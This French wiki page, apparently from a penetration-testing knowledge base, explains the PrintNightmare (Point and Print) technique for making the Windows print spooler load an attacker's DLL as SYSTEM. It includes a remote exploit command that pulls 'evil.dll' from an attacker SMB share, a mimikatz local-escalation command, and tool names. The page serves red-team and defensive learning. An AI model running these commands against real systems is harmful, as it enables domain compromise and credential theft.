---
title: "Point and Print : charger un pilote en tant que SYSTEM"
description: "Abuser de l'installation de pilote du Print Spooler (RpcAddPrinterDriverEx) et de Point and Print pour charger une DLL fournie par l'attaquant et exécuter en tant que SYSTEM, à la fois à distance en tant qu'utilisateur authentifié (PrintNightmare) et localement pour une élévation de privilèges."
keywords:
  - PrintNightmare
  - Point and Print
  - RpcAddPrinterDriverEx
  - SpoolFool
  - SYSTEM
---

# Point and Print

**Point and Print** permet à un utilisateur d'installer une imprimante et son pilote automatiquement, sans droits d'administrateur, afin que le client puisse imprimer sur une imprimante partagée sans configuration manuelle. Le chemin d'installation de pilote du spooler, `RpcAddPrinterDriverEx`, fait confiance à l'appelant pour désigner un pilote, et une faille de logique a permis à un **utilisateur non privilégié de fournir sa propre DLL** et de faire charger celle-ci par le spooler en tant que **SYSTEM**. C'est la classe PrintNightmare, et elle fonctionne à la fois **à distance** (en tant que n'importe quel utilisateur authentifié contre un spooler distant) et **localement** (pour une élévation de privilèges vers SYSTEM).

## Exécution de code à distance

```bash
# ly4k's PrintNightmare: load a DLL (served from a reachable SMB share) onto the remote spooler as SYSTEM
printnightmare.py -dll '\\<attacker>\share\evil.dll' 'example.local/user:password@<target>'
```

La DLL de charge utile est placée sur un partage atteignable ; le spooler la copie et l'exécute, donnant une exécution de code en tant que SYSTEM sur la cible.

## Élévation de privilèges locale

Sur un hôte où vous vous exécutez déjà en tant qu'utilisateur à faibles privilèges, le même chemin de chargement de pilote (et des bugs de spooler ultérieurs comme SpoolFool, qui dépose un répertoire depuis lequel le spooler charge) permet une élévation vers **SYSTEM** localement :

```text
# mimikatz exploits only when given a payload library; without /library it just lists drivers
misc::printnightmare /library:<payload.dll>
# SpoolFool and similar tools exploit the spooler's file handling for local SYSTEM
```

## Notes d'exploitation

- La variante à distance ne nécessite qu'un **utilisateur authentifié** et un spooler atteignable, plus un partage SMB que la cible peut lire, c'est donc une primitive puissante de mouvement latéral et de compromission de DC là où le spooler est exposé.
- Le **durcissement** de Point and Print (restreindre l'installation de pilotes aux administrateurs) est le véritable verrou ; là où il est assoupli pour des raisons d'ergonomie, la technique continue de fonctionner.
- Le gain est **SYSTEM**, donc sur un contrôleur de domaine il s'agit d'une compromission du domaine et sur un poste de travail d'un contrôle local complet, y compris le vol d'identifiants.
- Il s'agit d'exécution de code ; pour seulement forcer une authentification en vue d'un relais, utilisez plutôt le [PrinterBug](coercion.md).

## Outils

- **PrintNightmare (ly4k)** / l'exploit de cube0x0 / Invoke-Nightmare : exécution par chargement de pilote à distance et locale.
- **mimikatz** (`misc::printnightmare`) : SYSTEM local via le spooler.
- **SpoolFool** : élévation de privilèges locale par la gestion de fichiers du spooler.

## Références

- [itm4n: a practical guide to PrintNightmare in 2024](https://itm4n.github.io/printnightmare-exploitation/)
- [The Hacker Recipes: PrintNightmare](https://www.thehacker.recipes/ad/movement/print-spooler-service/printnightmare)
- [PrintNightmare (ly4k)](https://github.com/ly4k/PrintNightmare)
- [SpoolFool (Oliver Lyak)](https://github.com/ly4k/SpoolFool)
